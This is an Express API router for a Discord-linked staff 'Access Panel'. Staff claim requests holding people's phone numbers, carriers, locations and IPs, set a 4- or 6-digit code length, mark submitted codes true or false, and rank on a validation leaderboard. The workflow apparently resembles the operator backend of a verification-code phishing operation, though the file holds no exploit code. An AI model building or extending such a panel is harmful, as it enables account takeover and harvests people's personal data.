/**
 * web/api.js — JSON API for the dashboard's own JS (src/web/public/app.js)
 *
 * Mounted at /api by server.js, already behind requireStaff (every route
 * here assumes req.session.user exists and is staff). Ban is additionally
 * gated to Owner, mirroring /banip in slash.js.
 */

import express from "express";
import { CONFIG, OPERATOR_GROUPS, getOperatorGroup } from "../config.js";
import { getActiveRequests, getStaffLeaderboard, upsertStaffPrefs, resetStaffPrefs, getActiveClaims, getPersonalStats, getRecentActions } from "../database.js";
import { getPrefs, primePrefs, forgetPrefs } from "../utils/userPrefs.js";
import {
    webClaim, webSetLength, webWrongNumber, webUnclaim,
    webTrueCode, webFalseCode, webBanIp,
} from "./actions.js";

/** Best-effort real Discord tag ("name#0") for a user ID — cache hit first, REST fetch as a fallback. */
async function resolveUserTag(client, userId) {
    try {
        const cached = client.users.cache.get(userId);
        const user   = cached || await client.users.fetch(userId);
        return user.tag || user.username;
    } catch {
        return userId; // last resort — still usable, just not pretty
    }
}

function serializeRequest(row) {
    return {
        id:                 row.id,
        username:           row.username,
        phone:              row.phone,
        operator:           row.operator,
        operatorGroup:      getOperatorGroup(row.operator),
        country:            row.country,
        city:               row.city,
        ip:                 row.ip_address,
        status:             row.status,
        staffCode:          row.staff_code || null,
        codeLength:         row.code_length || null,
        claimedByDiscordId: row.claimed_by_discord_id || null,
        createdAt:          row.created_at,
        updatedAt:          row.updated_at,
    };
}

export function createApiRouter(client) {
    const router = express.Router();

    router.get("/me", (req, res) => {
        const u = req.session.user;
        res.json({
            id: u.id, username: u.username, avatar: u.avatar, owner: u.owner, staff: u.staff,
            unclaimedMaxAgeMinutes: CONFIG.UNCLAIMED_MAX_AGE_MINUTES,
        });
    });

    router.get("/requests", async (req, res) => {
        try {
            const rows = await getActiveRequests();
            res.json(rows.map(serializeRequest));
        } catch (e) {
            console.error("❌ [web] /api/requests error:", e.message);
            res.status(500).json({ error: "db_error" });
        }
    });

    router.get("/leaderboard", async (req, res) => {
        try {
            const rows = await getStaffLeaderboard(10);
            res.json(rows);
        } catch (e) {
            console.error("❌ [web] /api/leaderboard error:", e.message);
            res.status(500).json({ error: "db_error" });
        }
    });

    // ── Actions — every handler follows the same shape: resolve the caller's
    // REAL Discord tag first (so /banip-style logging and personal stats /
    // leaderboard group web actions under the exact same identity Discord
    // itself would use — using the OAuth2 display name instead would silently
    // split one person's history into two identities depending on which side
    // they acted from), run the shared action, translate its {success,
    // message} into an HTTP status the frontend understands. ──

    function actionRoute(handler) {
        return async (req, res) => {
            const tag = await resolveUserTag(client, req.session.user.id);
            const staffUser = { id: req.session.user.id, username: tag };
            const ownerBypass = !!req.session.user.owner;
            try {
                const result = await handler(req, staffUser, ownerBypass);
                if (!result.success) return res.status(409).json({ success: false, message: result.message });
                res.json({ success: true });
            } catch (e) {
                console.error(`❌ [web] action error (${req.path}):`, e.message || e);
                res.status(500).json({ success: false, message: "Network/server error." });
            }
        };
    }

    router.post("/requests/:phone/claim", actionRoute((req, staffUser) =>
        webClaim(client, req.params.phone, staffUser)
    ));

    router.post("/requests/:phone/length", actionRoute((req, staffUser, ownerBypass) => {
        const length = Number(req.body?.length);
        if (length !== 4 && length !== 6) return Promise.resolve({ success: false, message: "Length must be 4 or 6." });
        return webSetLength(client, req.params.phone, length, staffUser, ownerBypass);
    }));

    router.post("/requests/:phone/wrong", actionRoute((req, staffUser, ownerBypass) =>
        webWrongNumber(client, req.params.phone, staffUser, ownerBypass)
    ));

    router.post("/requests/:phone/unclaim", actionRoute((req, staffUser, ownerBypass) =>
        webUnclaim(client, req.params.phone, staffUser, ownerBypass, CONFIG.ACCESS_ROLE_ID)
    ));

    router.post("/requests/:phone/truecode", actionRoute((req, staffUser, ownerBypass) =>
        webTrueCode(client, req.params.phone, staffUser, ownerBypass)
    ));

    router.post("/requests/:phone/falsecode", actionRoute((req, staffUser, ownerBypass) =>
        webFalseCode(client, req.params.phone, staffUser, ownerBypass)
    ));

    router.post("/ban", async (req, res) => {
        if (!req.session.user.owner) return res.status(403).json({ success: false, message: "Owner only." });
        const ip = (req.body?.ip || "").trim();
        if (!ip) return res.status(400).json({ success: false, message: "Missing IP." });
        try {
            const tag = await resolveUserTag(client, req.session.user.id);
            const result = await webBanIp(ip, { id: req.session.user.id, username: tag });
            if (!result.success) return res.status(409).json(result);
            res.json({ success: true });
        } catch (e) {
            console.error("❌ [web] /api/ban error:", e.message);
            res.status(500).json({ success: false, message: "Network/server error." });
        }
    });

    // ── Personal settings (mirrors the Discord ephemeral settings panel) ──

    router.get("/settings", async (req, res) => {
        try {
            const prefs = await getPrefs(req.session.user.id);
            res.json({ prefs, operatorGroups: OPERATOR_GROUPS });
        } catch (e) {
            console.error("❌ [web] /api/settings GET error:", e.message);
            res.status(500).json({ error: "db_error" });
        }
    });

    const SNOOZE_HOURS = { "1h": 1, "4h": 4, "8h": 8, "24h": 24 };

    router.post("/settings", async (req, res) => {
        const userId = req.session.user.id;
        const body = req.body || {};
        const patch = {};

        if (typeof body.language === "string") patch.language = body.language;
        if (typeof body.receive_pings === "boolean") patch.receive_pings = body.receive_pings;
        if (typeof body.daily_summary === "boolean") patch.daily_summary = body.daily_summary;
        if (Array.isArray(body.dm_alert_operators)) {
            patch.dm_alert_operators = body.dm_alert_operators.length > 0 ? body.dm_alert_operators.join(",") : null;
        }
        if (typeof body.snooze === "string") {
            if (body.snooze === "clear") {
                patch.snooze_until = null;
            } else if (SNOOZE_HOURS[body.snooze]) {
                patch.snooze_until = new Date(Date.now() + SNOOZE_HOURS[body.snooze] * 3_600_000).toISOString();
            }
        }

        try {
            const prefs = await upsertStaffPrefs(userId, patch);
            primePrefs(userId, prefs); // write-through: the Discord side sees this instantly too
            res.json({ success: true, prefs });
        } catch (e) {
            console.error("❌ [web] /api/settings POST error:", e.message);
            res.status(500).json({ success: false, message: "Could not save settings." });
        }
    });

    router.post("/settings/reset", async (req, res) => {
        const userId = req.session.user.id;
        try {
            const prefs = await resetStaffPrefs(userId);
            forgetPrefs(userId); // dropped from Postgres — drop the cached copy too, not just leave the old values cached
            res.json({ success: true, prefs });
        } catch (e) {
            console.error("❌ [web] /api/settings/reset error:", e.message);
            res.status(500).json({ success: false, message: "Could not reset settings." });
        }
    });

    router.get("/settings/claims", async (req, res) => {
        try {
            const rows = await getActiveClaims(req.session.user.id);
            res.json(rows);
        } catch (e) {
            console.error("❌ [web] /api/settings/claims error:", e.message);
            res.status(500).json({ error: "db_error" });
        }
    });

    router.get("/settings/stats", async (req, res) => {
        try {
            const tag = await resolveUserTag(client, req.session.user.id);
            const { byAction, today } = await getPersonalStats(tag);
            const counts = {};
            byAction.forEach(r => { counts[r.action] = Number(r.count); });
            res.json({ claims: counts.claim || 0, validations: counts.true_code || 0, rejections: counts.false_code || 0, today });
        } catch (e) {
            console.error("❌ [web] /api/settings/stats error:", e.message);
            res.status(500).json({ error: "db_error" });
        }
    });

    router.get("/settings/history", async (req, res) => {
        try {
            const tag = await resolveUserTag(client, req.session.user.id);
            const rows = await getRecentActions(tag, 10);
            res.json(rows);
        } catch (e) {
            console.error("❌ [web] /api/settings/history error:", e.message);
            res.status(500).json({ error: "db_error" });
        }
    });

    router.get("/settings/rank", async (req, res) => {
        try {
            const tag  = await resolveUserTag(client, req.session.user.id);
            const rows = await getStaffLeaderboard(1000);
            const idx  = rows.findIndex(r => r.staff === tag);
            res.json({ rank: idx === -1 ? null : idx + 1, total: rows.length, validations: idx === -1 ? 0 : rows[idx].validations });
        } catch (e) {
            console.error("❌ [web] /api/settings/rank error:", e.message);
            res.status(500).json({ error: "db_error" });
        }
    });

    router.post("/settings/testalert", async (req, res) => {
        try {
            const user = await client.users.fetch(req.session.user.id);
            await user.send({ content: "🔔 Test alert from the Access Panel — if you can read this, your DMs are reachable." });
            res.json({ success: true });
        } catch (e) {
            res.json({ success: false, message: e?.code === 50007 ? "Your DMs are closed." : "Could not send a DM." });
        }
    });

    return router;
}
